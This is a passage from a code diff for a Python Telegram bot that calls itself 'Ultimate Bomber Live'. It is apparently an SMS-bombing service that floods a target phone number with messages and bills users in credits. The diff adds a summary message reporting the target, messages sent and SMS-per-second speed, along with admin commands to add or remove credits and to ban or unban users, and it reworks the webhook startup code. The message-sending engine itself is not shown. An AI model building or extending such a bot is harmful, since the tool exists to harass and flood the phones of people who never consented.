+            reason = "🛑 **Stopped by you**"
+        elif s.get("time_up"):
+            reason = f"⏰ **{mins_to_use} Minutes Completed!**"
+        else:
+            reason = "✅ **Finished**"
+            
+        await telegram_app.bot.send_message(
+            uid, 
+            f"{reason}!\n\n"
+            f"🎯 Target: `{target}`\n"
+            f"📨 Total Sent: *{sent}*\n"
+            f"⚡ Speed: *{speed} SMS/sec*\n"
+            f"⏱ Time: {elapsed//60}m {elapsed%60}s\n"
+            f"💳 Credits Left: `{get_user(uid)['credits']}`", 
+            parse_mode="Markdown"
+        )
     except Exception:
         pass
 
+# ================== ADMIN COMMANDS ==================
+async def add_credit_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
+    if update.effective_user.id != ADMIN_ID: return
+    try:
+        target_id = ctx.args[0]
+        amount = int(ctx.args[1])
+        u = get_user(target_id)
+        u["credits"] += amount
+        save_db()
+        await update.message.reply_text(f"✅ Added `{amount}` credits to `{target_id}`.\nNew Balance: `{u['credits']}`", parse_mode="Markdown")
+    except Exception:
+        await update.message.reply_text("❌ Usage: `/add <user_id> <amount>`\nExample: `/add 123456789 50`", parse_mode="Markdown")
 
-# ================== WEBHOOK & STARLETTE ==================
-async def health(request):
-    return PlainTextResponse("OK", status_code=200)
+async def remove_credit_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
+    if update.effective_user.id != ADMIN_ID: return
+    try:
+        target_id = ctx.args[0]
+        amount = int(ctx.args[1])
+        u = get_user(target_id)
+        u["credits"] = max(0, u["credits"] - amount)
+        save_db()
+        await update.message.reply_text(f"✅ Deducted `{amount}` credits from `{target_id}`.\nNew Balance: `{u['credits']}`", parse_mode="Markdown")
+    except Exception:
+        await update.message.reply_text("❌ Usage: `/remove <user_id> <amount>`\nExample: `/remove 123456789 10`", parse_mode="Markdown")
+
+async def ban_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
+    if update.effective_user.id != ADMIN_ID: return
+    try:
+        target_id = ctx.args[0]
+        u = get_user(target_id)
+        u["banned"] = True
+        save_db()
+        await update.message.reply_text(f"🚫 Banned `{target_id}`.")
+    except Exception:
+        await update.message.reply_text("❌ Usage: `/ban <user_id>`")
+
+async def unban_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
+    if update.effective_user.id != ADMIN_ID: return
+    try:
+        target_id = ctx.args[0]
+        u = get_user(target_id)
+        u["banned"] = False
+        save_db()
+        await update.message.reply_text(f"✅ Unbanned `{target_id}`.")
+    except Exception:
+        await update.message.reply_text("❌ Usage: `/unban <user_id>`")
 
 
-async def root(request):
-    return PlainTextResponse("Ultimate Bomber Live 💥")
-
+# ================== STARTUP & WEBHOOK ==================
+async def health(request): return PlainTextResponse("OK", status_code=200)
+async def root(request): return PlainTextResponse("Ultimate Bomber Live 💥")
 
 async def startup():
     global telegram_app
     if not WEBHOOK_URL:
-        logger.warning("RENDER_EXTERNAL_URL not set — webhook will NOT be registered")
+        logger.warning("⚠️ RENDER_EXTERNAL_URL not set")
         return
     webhook_path = f"/webhook/{BOT_TOKEN}"
     full_url = f"{WEBHOOK_URL}{webhook_path}"
 
     telegram_app = Application.builder().token(BOT_TOKEN).updater(None).build()
+    
     telegram_app.add_handler(CommandHandler("start", start_cmd))
+    telegram_app.add_handler(CommandHandler("add", add_credit_cmd))
+    telegram_app.add_handler(CommandHandler("remove", remove_credit_cmd))
+    telegram_app.add_handler(CommandHandler("ban", ban_cmd))
+    telegram_app.add_handler(CommandHandler("unban", unban_cmd))
     telegram_app.add_handler(CallbackQueryHandler(button_handler))
     telegram_app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, text_handler))
 
@@ -349,10 +523,8 @@ async def startup():
     await telegram_app.start()
     logger.info(f"✅ Webhook set: {full_url}")
 
-
 async def webhook(request):
-    if telegram_app is None:
-        return Response("not ready", status_code=503)
+    if telegram_app is None: return Response("not ready", status_code=503)
     try:
         data = await request.json()
         update = Update.de_json(data, telegram_app.bot)
@@ -361,28 +533,22 @@ async def webhook(request):
         logger.exception(f"webhook error: {e}")
     return Response("ok")
 
-
 async def shutdown():
     global _http_session, telegram_app
-    if _http_session and not _http_session.closed:
-        await _http_session.close()
+    if _http_session and not _http_session.closed: await _http_session.close()
     if telegram_app:
         await telegram_app.stop()
         await telegram_app.shutdown()
 
-
 def create_app() -> Starlette:
     routes = [
-        Route("/", root),
-        Route("/health", health),
+        Route("/", root), Route("/health", health),
         Route(f"/webhook/{BOT_TOKEN}", webhook, methods=["POST"]),
     ]
     return Starlette(routes=routes, on_startup=[startup], on_shutdown=[shutdown])
 
-
 app = create_app()
 
 if __name__ == "__main__":
-    if not BOT_TOKEN:
-        sys.exit("❌ BOT_TOKEN missing")
+    if not BOT_TOKEN: sys.exit("❌ BOT_TOKEN missing")
     uvicorn.run(app, host="0.0.0.0", port=PORT, log_level="info")
